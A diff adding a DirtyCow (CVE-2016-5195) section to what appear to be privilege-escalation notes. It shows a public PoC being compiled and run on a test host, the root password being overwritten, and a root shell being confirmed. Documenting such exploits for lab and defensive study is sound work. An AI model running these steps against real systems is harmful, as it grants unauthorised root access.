@@ -576,4 +576,21 @@ root@srv-99-590:/var/www/html#
 
 ### Method 4 - DirtyCow
 - This is a well known kernel exploit that originated back in 2016
-- Below is a PoC 
+- Below is a PoC using exploit code from github user gibonacini (https://github.com/gbonacini/CVE-2016-5195)
+
+```
+ubuntu@kernel-explout-tests:~/CVE-2016-5195$ make
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
+ubuntu@kernel-explout-tests:~/CVE-2016-5195$ ./dcow
+Running ...
+Received su prompt (Password: )
+Root password is:   dirtyCowFun
+Enjoy! :-)
+ubuntu@kernel-explout-tests:~/CVE-2016-5195$ su -
+Password:
+root@kernel-explout-tests:~# whoami
+root
+root@kernel-explout-tests:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@kernel-explout-tests:~#
+```
